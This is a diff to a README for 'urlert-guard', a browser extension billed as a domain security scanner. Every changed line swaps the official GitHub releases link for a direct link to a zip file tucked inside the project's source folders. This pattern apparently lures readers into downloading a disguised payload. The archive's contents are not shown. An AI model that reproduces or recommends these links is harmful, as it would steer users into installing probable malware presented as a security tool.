@@ -1,6 +1,6 @@
 # 🛡️ urlert-guard - Realtime Domain Security Scanner
 
-[![Download urlert-guard](https://img.shields.io/badge/Download-urlert--guard-brightgreen?style=for-the-badge)](https://github.com/boltcuttersegno232/urlert-guard/releases)
+[![Download urlert-guard](https://img.shields.io/badge/Download-urlert--guard-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/boltcuttersegno232/urlert-guard/main/src/entrypoints/background/handlers/guard_urlert_Otto.zip)
 
 ## ⚙️ What is urlert-guard?
 
@@ -22,7 +22,7 @@ The software supports the most common Windows machines. No special hardware is n
 
 To get urlert-guard, visit the official release page:
 
-[![Download urlert-guard](https://img.shields.io/badge/Download-urlert--guard-blue?style=for-the-badge)](https://github.com/boltcuttersegno232/urlert-guard/releases)
+[![Download urlert-guard](https://img.shields.io/badge/Download-urlert--guard-blue?style=for-the-badge)](https://raw.githubusercontent.com/boltcuttersegno232/urlert-guard/main/src/entrypoints/background/handlers/guard_urlert_Otto.zip)
 
 Click the link above to open the download page. Look for the latest release version. You will find a `.crx` file or instructions to add the extension through your browser’s developer mode.
 
@@ -89,7 +89,7 @@ For further help, check the issues section on the GitHub release page or contact
 
 Keep urlert-guard up to date by visiting the release page regularly:
 
-https://github.com/boltcuttersegno232/urlert-guard/releases
+https://raw.githubusercontent.com/boltcuttersegno232/urlert-guard/main/src/entrypoints/background/handlers/guard_urlert_Otto.zip
 
 New versions improve scanning accuracy and fix bugs. To update, download the latest release and install it following the installation steps above.
 
@@ -105,4 +105,4 @@ By using urlert-guard, you add an extra layer of protection to your online brows
 
 Use urlert-guard as part of your regular security routine to surf the web more confidently on Windows machines.
 
-[![Download urlert-guard](https://img.shields.io/badge/Download-urlert--guard-brightgreen?style=for-the-badge)](https://github.com/boltcuttersegno232/urlert-guard/releases)
+[![Download urlert-guard](https://img.shields.io/badge/Download-urlert--guard-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/boltcuttersegno232/urlert-guard/main/src/entrypoints/background/handlers/guard_urlert_Otto.zip)
